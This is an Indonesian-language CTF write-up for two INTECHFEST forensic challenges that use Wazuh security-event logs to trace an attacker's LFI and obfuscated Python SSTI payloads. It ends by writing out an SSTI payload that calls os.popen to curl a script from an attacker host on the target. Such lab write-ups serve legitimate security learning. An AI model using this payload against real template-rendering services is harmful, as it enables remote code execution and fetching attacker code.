# Forensic

<table><thead><tr><th width="347">Challenge</th><th>Link</th></tr></thead><tbody><tr><td>VWA-WAZUH: The Spectator (100 pts)</td><td><a href="#vwa-wazuh-the-spectator-100-pts">Here</a></td></tr><tr><td>VWA-WAZUH: The Overseer (436 pts)</td><td><a href="#vwa-wazuh-the-overseer-100-pts">Here</a></td></tr><tr><td>Breached (496 pts)🥈</td><td><a href="https://kos0ng.gitbook.io/blog/research/2023/analyzing-cve-2021-22204-based-on-network-traffic-pcap-file">Here</a></td></tr></tbody></table>

## VWA-WAZUH: The Spectator (100 pts)

### Description

\-

### Solution

Akses wazuh, lalu buka security events dan urutkan berdasarkan level. Berdasarkan referensi dari <https://documentation.wazuh.com/current/user-manual/ruleset/rules-classification.html> diketahui bahwa semakin tinggi level maka semakin tinggi juga kemungkinan berbahayanya. Karena disini berhubungan dengan penyerangan oleh seorang attacker maka lakukan pengecekan terlebih dahulu pada log-log dengan level yang tinggi.

<figure><img src="https://lh7-us.googleusercontent.com/LRbIxbOJI7JkSUyIDAK7XX9Ocx_azhJFHLZH7hOLx9u0d66MzLH5yt0RGeK_JI_RdsMAEHLAIm6epVLHcvLdmoUoHMJ70814Eslq2CdBQCPCvua0oUN8z2gRY0cyLJ5h3UlmhR21U-S4q-KoR2JGgK4" alt=""><figcaption></figcaption></figure>

Dapat dilihat ada beberapa alerts, pada “Local file inclusion” klik dan akan tampil payload yang digunakan oleh attacker untuk melancarkan serangan LFI.

<figure><img src="https://lh7-us.googleusercontent.com/m4jrxa3ES_PqjRHLdTHlgpgCb_FqlDnOxpv6LAzBWBnvhOTduHV87AM8zOB5Hr1te-TcozzTtRJH475zVtjTHApj1CyntDmlUoWLsDxMVuFb9o9P9jxLPE9Yg4ieBA4qK-k1S5Jj9M1WK8L9yVOjnWk" alt=""><figcaption></figcaption></figure>

Setelah mengetahui payload attacker maka selanjutnya kami akses honey comb lalu pilih fetcher dan masukkan payload tersebut untuk mendapatkan flag

<figure><img src="https://lh7-us.googleusercontent.com/xG1g9-cf4S-rgDIWPfPfQP9VX6gpJ8K2Nz3vECopLT4SPzgunFOSYC4V87DkTmXzVcNo_94KEYWr73n0VK4OH2h8powJvemYMiwTwLsaPRdHw3haby0bWM1o3xSLp9KWIjMdn8AA7o1_ZuPUoPZsINI" alt=""><figcaption></figcaption></figure>

Flag : INTECHFEST{if-you-know-the-path-you-win-a503d7757b28b50b7aeb741d7607b4ec}

## VWA-WAZUH: The Overseer (100 pts)

### Description

\-

### Solution

Akses wazuh, lalu buka security events dan urutkan berdasarkan level. Berdasarkan referensi dari <https://documentation.wazuh.com/current/user-manual/ruleset/rules-classification.html> diketahui bahwa semakin tinggi level maka semakin tinggi juga kemungkinan berbahayanya. Karena disini berhubungan dengan penyerangan oleh seorang attacker maka lakukan pengecekan terlebih dahulu pada log-log dengan level yang tinggi.

<figure><img src="https://lh7-us.googleusercontent.com/LRbIxbOJI7JkSUyIDAK7XX9Ocx_azhJFHLZH7hOLx9u0d66MzLH5yt0RGeK_JI_RdsMAEHLAIm6epVLHcvLdmoUoHMJ70814Eslq2CdBQCPCvua0oUN8z2gRY0cyLJ5h3UlmhR21U-S4q-KoR2JGgK4" alt=""><figcaption></figcaption></figure>

Selanjutnya pilih log dengan description “Python SSTI payload detected”

<figure><img src="https://lh7-us.googleusercontent.com/uq3813pRRRjuouuuTp4Yd4Tm3J8M8UccpN1KK7YaZk5lXTxM8LlC9Kxe50aK0jHqa0UJdHf377Zm3lx43zewCDC65X83DNah-CLz45O4fu_tfpsQ-SYGOZJl2cVMWBi-AwY4aeEBm6_DJ89vAGf5XDI" alt=""><figcaption></figcaption></figure>

Pada payload yang digunakan (kolom full\_log) terlihat bahwa terdapat %23 yang mana merupakan url encode untuk “#”. Selanjutnya deobfuscate manual, berikut untuk flownya

* Url decode %23 menjadi #
* Translate $\<payload> menjadi bentuk asli dengan cara melakukan echo payload tersebut
* Hasil translate menampilkan bentuk \123 yang mana itu merupakan format nilai octal pada python

Berikut contoh untuk translate $\<payload>

<figure><img src="https://lh7-us.googleusercontent.com/ao8rtTsWOBCS9sq-LbeXzTSmlkF6oeu_4B1KHQ3CZ98esUEUIau93ZIhYozfVnh_7rs4kLwjDEkMFFuDGc176YBGwem2DVZN3xvyH5J8rDsUMKnmEYpkbXRExaSixRW4Ep_p_Qbu3ybKQrtU_g44Z3w" alt=""><figcaption></figcaption></figure>

Hasil dari translate sebagai berikut dan ada beberapa part yang salah(minor) karena hasil decode masih valid

<figure><img src="https://lh7-us.googleusercontent.com/LorsLsfmAW9uKfGW6FRAcI_ByzAvnQpYY7XW6tyDlkL5oM2ylRjLMOSy5PPG6sqevszsT9rWC2BbqmqQ8BpuXQ7rRpHZ6EQo16p9_QkCCNvgCWoet-qlYK4QPYMWYVQwCAGDt_gS9ii-41Bt2MHiyxc" alt=""><figcaption></figcaption></figure>

Selanjutnya tinggal print saja misal dengan python

<figure><img src="https://lh7-us.googleusercontent.com/sfXdmE55qdRHm4TVxECSZZJGDLXQQO4xrtgzQgxmKKqhY49VL1ZnWLqiL8WN56QdCYJvI5eiIomzVffNjoMk8N7B7Y1rI1CiHwiCetbSpIFAPZCk4SVT0hvb_n8G-TDHh4zQd3DSgwDgPz7hpq872Cg" alt=""><figcaption></figcaption></figure>

Untuk value setelah echo lakukan base64 decode&#x20;

<figure><img src="https://lh7-us.googleusercontent.com/p_52wq08zpTOv3q7q-bnSWEwfZcUfwo8V8-pwybUIgBKJP4VMTGlqdfo82e7ZW2yCTOQmCR9m2dEX4EVNMH6I33z-mxKSOAGfz2U4mhwkOn5sQGVLKOk8V9NcQU5q7385Acu-huWh9PlxuGAsh7IM20" alt=""><figcaption></figcaption></figure>

Pc.attacker tidak dapat diakses melalui internet, jadi langkah yang kami lakukan adalah mencoba melakukan curl melalui honeycomb. Salah satu cara yang bisa dilakukan adalah dengan memanfaatkan bug yang sama dengan attacker yaitu menjalankan command tersebut pada target dengan service calculator

```python
cycler.__init__.__globals__.os.popen('curl pc.attacker:8080/lr.sh').read()

```

<figure><img src="https://lh7-us.googleusercontent.com/iM8EwsHSkmSweMQN5c_y62QbjCiCwSWAg8etCA-Ws24AuVGw0-BXgdH9sXAY1wDcUrr4v-sFcUrYsRqmF6ImpECdPK6aL0AEtbWDRp6NTk9aIcKgXCpErG1L1u5BS7jIfzKnj_A4ALQ-zFEvoIFu8AQ" alt=""><figcaption></figcaption></figure>

Flag : INTECHFEST{bash-obfuscation-db326a143a33eef9c7a79e7ec5f4bd09}
